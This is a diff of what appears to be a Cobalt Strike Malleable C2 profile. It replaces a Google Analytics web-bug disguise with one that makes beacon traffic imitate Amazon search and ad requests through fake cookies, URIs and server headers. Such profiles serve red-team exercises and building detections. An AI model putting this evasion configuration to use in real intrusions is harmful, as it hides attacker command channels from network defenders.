@@ -1,99 +1,83 @@
-# make our C2 look like a Google Web Bug
-# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
 #
-# Author: @armitagehacker
+# Amazon browsing traffic profile
+# 
+# Author: @harmj0y
+#
 
 set sleeptime "5000";
+set jitter    "0";
+set maxdns    "255";
+set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
 
 http-get {
-	set uri "/___utm.gif";
-	client {
-		parameter "utmac" "UA-2202604-2";
-		parameter "utmcn" "1";
-		parameter "utmcs" "ISO-8859-1";
-		parameter "utmsr" "1280x1024";
-		parameter "utmsc" "32-bit";
-		parameter "utmul" "en-US";
 
-		metadata {
-			base64url;
-			prepend "__utma";
-			#parameter "utmcc";
-			#header "x-test";
-			print;
-		}
-	}
+    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 
-	server {
-		header "Content-Type" "image/gif";
+    client {
 
-		output {
-			# hexdump pixel.gif
-			# 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
-			# 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
-			# 0000020 01 00 01 00 00 02 01 44 00 3b 
-			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
-			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
-			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
+        header "Accept" "*/*";
+        header "Host" "www.amazon.com";
 
-			print;
-		}
-	}
+        metadata {
+            base64;
+            prepend "session-token=";
+            prepend "skin=noskin;";
+            append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
+            header "Cookie";
+        }
+    }
+
+    server {
+
+        header "Server" "Server";
+        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
+        header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
+        header "X-Frame-Options" "SAMEORIGIN";
+        header "Content-Encoding" "gzip";
+
+        output {
+            print;
+        }
+    }
 }
 
 http-post {
-	set uri "/__utm.gif";
-	set verb "GET";
-	client {
-		# need to figure out ID still
-		id {
-			prepend "UA-220";
-			append "-2";
-			parameter "utmac";
-		}
+    
+    set uri "/N4215/adj/amzn.us.sr.aps";
 
-		parameter "utmcn" "1";
-		parameter "utmcs" "ISO-8859-1";
-		parameter "utmsr" "1280x1024";
-		parameter "utmsc" "32-bit";
-		parameter "utmul" "en-US";
+    client {
 
-		# weird. post uses output instead  of metadata
-		output {
-			base64url;
-			prepend "__utma";
-			#parameter "utmcc";
-			#header "x-test";
-			print;
-		}
-		
-	}
+        header "Accept" "*/*";
+        header "Content-Type" "text/xml";
+        header "X-Requested-With" "XMLHttpRequest";
+        header "Host" "www.amazon.com";
 
-	server {
-		header "Content-Type" "image/gif";
+        parameter "sz" "160x600";
+        parameter "oe" "oe=ISO-8859-1;";
 
-		output {
-			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
-			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
-			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
-			print;
-		}
-	}
-}
+        id {
+            parameter "sn";
+        }
 
-# dress up the staging process too
-http-stager {
-	set uri_x86 "/_init.gif";
-	set uri_x64 "/__init.gif";
+        parameter "s" "3717";
+        parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";
 
-	server {
-		header "Content-Type" "image/gif";
+        output {
+            base64;
+            print;
+        }
+    }
 
-		output {
-			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
-			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
-			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
-			print;
-		}
-	}
+    server {
+
+        header "Server" "Server";
+        header "x-amz-id-1" "THK9YEZJCKPGY5T42OZT";
+        header "x-amz-id-2" "a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
+        header "X-Frame-Options" "SAMEORIGIN";
+        header "x-ua-compatible" "IE=edge";
+
+        output {
+            print;
+        }
+    }
 }
